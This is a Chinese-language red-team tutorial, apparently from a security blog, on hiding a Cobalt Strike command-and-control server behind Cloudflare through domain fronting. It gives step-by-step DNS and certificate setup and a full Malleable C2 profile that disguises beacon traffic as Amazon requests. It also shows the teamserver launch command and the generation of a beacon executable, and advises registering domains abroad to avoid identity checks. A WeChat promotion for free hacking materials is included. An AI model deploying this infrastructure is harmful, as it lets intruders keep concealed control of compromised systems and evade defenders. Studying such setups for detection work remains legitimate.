# 域前置介绍

域前置又译为域名幌子，是一种隐藏连接真实端点来规避审查的技术。在应用层上运作时，域前置使用户能通过HTTPS连接到被屏蔽的服务，而表面上像在与另一个完全不同的站点通信。

# 域前置工作原理

域前置核心就是CDN，可以通过添加 A 记录或 AAAA 记录解析的方式将网站域名指向网站服务器公网 IP
地址，来实现用户可以通过域名直接访问已部署在服务器上的网站，而无需使用难记且无明显标识的 IP
地址访问。CDN能够对域名进行加速，当对某个域名进行访问时，并不会直接解析到IP，因此可以给攻击V-PS申请一个CDN加速服务，从而达到隐藏IP的效果

# CDN工作原理

CND又叫内容分发网络（Content Delivery Network）

当用户访问域名时，先请求LDNS(即本地dns)，如果有缓存会返回给用户ip地址，如果LNDS无缓存即向授权DNS请求，授权DNS解析域名返回别名域名，域名解析请求发送至公有云DNS调度系统，则会分配最佳节点ip地址，LDNS会缓存该IP地址，用户根据该ip地址请求资源，节点ip隐藏了真实ip的地址。

# 搭建过程

这里选择腾讯云的域名

![image-20220913105312471](https://image.3001.net/images/20221109/1667977394_636b50b2295d0927058b6.png!small)

先实名后注册，注册时间可能比较久，在腾讯云服务器上，根据申请的域名添加解析记录。

![image-20220913162859561](https://image.3001.net/images/20221109/1667977395_636b50b381c5d4a17d37d.png!small)

域名备案， **实际上国内的备案了之后Redteam已无法使用了。**

【----帮助网安学习，以下所有学习资料免费领！加vx：yj009991，备注“freebuf”获取！】

① 网安学习成长路径思维导图  
② 60+网安经典常用工具包  
③ 100+SRC漏洞分析报告  
④ 150+网安攻防实战技术电子书  
⑤ 最权威CISSP 认证考试指南+题库  
⑥ 超1800页CTF实战技巧手册  
⑦ 最新网安大厂面试题合集（含答案）  
⑧ APP客户端安全检测指南（安卓+IOS）

注册 **cloudflare**

> <https://www.cloudflare.com/zh-cn/>

进入后添加站点

![image-20220913161642500](https://image.3001.net/images/20221109/1667977396_636b50b4a6a6562f11c6d.png!small)

输入申请的域名别名，选择免费即可

![image-20221108131822302](https://image.3001.net/images/20221109/1667977397_636b50b5cfadf6eea5ebe.png!small)

继续

![image-20221108180955483](https://image.3001.net/images/20221109/1667977399_636b50b73579ffa2bae13.png!small)

这里会对域名的A记录和CNAME自动进行检测

![image-20221108135323024](https://image.3001.net/images/20221109/1667977400_636b50b85e97a06b29426.png!small)

这个时候邮箱会收到cloudflare的邮件。

修改dns记录， **域名注册- >我的域名->概览**位置 **修改dns**

![image-20220913162618436](https://image.3001.net/images/20221109/1667977401_636b50b99a3d2ab73e166.png!small)

然后等待dns刷新即可，此时我们ping一下我们的域名发现，解析后的ip地址不是真实的ip地址。

![image-20221108141421304](https://image.3001.net/images/20221109/1667977402_636b50bab000e6abb9b37.png!small)

ip地址为cloudflare的ip

![image-20221108143012368](https://image.3001.net/images/20221109/1667977403_636b50bbc40e150f86a2d.png!small)

![image-20221108143436931](https://image.3001.net/images/20221109/1667977404_636b50bcc533abf6b8b41.png!small)

nslookup查询

![image-20221108144259123](https://image.3001.net/images/20221109/1667977405_636b50bdedc594e2dd356.png!small)

# SSL/TLS

如果要实现https加密需要下载配置c2证书

![image-20221108184615960](https://image.3001.net/images/20221109/1667977407_636b50bf2128bf5b268a5.png!small)

下载证书

![image-20221108184740975](https://image.3001.net/images/20221109/1667977408_636b50c06bf32870ec94d.png!small)

在V-PS需重新生成cs的配置文件 **cobalstrike.store**

# C2配置隐藏

项目地址

> <https://github.com/rsmudge/Malleable-C2-Profiles>
    
    
    set sleeptime "5000";  
    set jitter    "0";  
    set maxdns    "255";  
    set useragent "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko";  
    ​  
    http-get {  
    ​  
    set uri "/s/ref=nb_sb_noss_1/167-3294888-0262949/field-keywords=books";  
      
    client {  
      
      header "Accept" "*/*";  
      header "Host" "www.xxx.xxx";    #配置自己的根域名不是别名  
      
      metadata {  
          base64;  
          prepend "session-token=";  
          prepend "skin=noskin;";  
          append "csm-hit=s-24KU11BB82RZSYGJ3BDK|1419899012996";  
          header "Cookie";  
      }  
    }  
      
    server {  
      
      header "Server" "Server";  
      header "x-amz-id-1" "THKUYEZKCKPGY5T42PZT";  
      header "x-amz-id-2" "a21yZ2xrNDNtdGRsa212bGV3YW85amZuZW9ydG5rZmRuZ2tmZGl4aHRvNDVpbgo=";  
      header "X-Frame-Options" "SAMEORIGIN";  
      header "Content-Encoding" "gzip";  
      
      output {  
          print;  
      }  
    }  
    ​  
    }  
    ​  
    http-post {  
      
    ​  
    set uri "/N4215/adj/amzn.us.sr.aps";  
      
    client {  
      
      header "Accept" "*/*";  
      header "Content-Type" "text/xml";  
      header "X-Requested-With" "XMLHttpRequest";  
      header "Host" "www.xxx.xxx";   #配置自己的根域名不是别名  
      
      parameter "sz" "160x600";  
      parameter "oe" "oe=ISO-8859-1;";  
      
      id {  
          parameter "sn";  
      }  
      
      parameter "s" "3717";  
      parameter "dc_ref" "http%3A%2F%2Fwww.amazon.com";  
      
      output {  
          base64;  
          print;  
      }  
    }  
      
    server {  
      
      header "Server" "Server";  
      header "x-amz-id-1" "THK9YEZJCKPGY5T42OZT";  
      header "x-amz-id-2" "a21JZ1xrNDNtdGRsa219bGV3YW85amZuZW9zdG5rZmRuZ2tmZGl4aHRvNDVpbgo=";  
      header "X-Frame-Options" "SAMEORIGIN";  
      header "x-ua-compatible" "IE=edge";  
      
      output {  
          print;  
      }  
    }  
    ​  
    }

启动服务端，调用配置文件

> ./teamserver cs服务端ip password config.profile

生成监听

![image-20221108174102315](https://image.3001.net/images/20221109/1667977409_636b50c17bbb441cd7039.png!small)

保存

![image-20221108182937336](https://image.3001.net/images/20221109/1667977410_636b50c26a348a1214742.png!small)

生成64位的应用程序

![image-20221108173651946](https://image.3001.net/images/20221109/1667977411_636b50c369e4f39a34c80.png!small)

成功上线

# TIPS

实名注册的腾讯云域名的话是有备案的，所以这里的话建议选择国外的服务器注册域名。

 **更多网安技能的在线实操练习，[请点击这里>>](https://www.hetianlab.com/)**

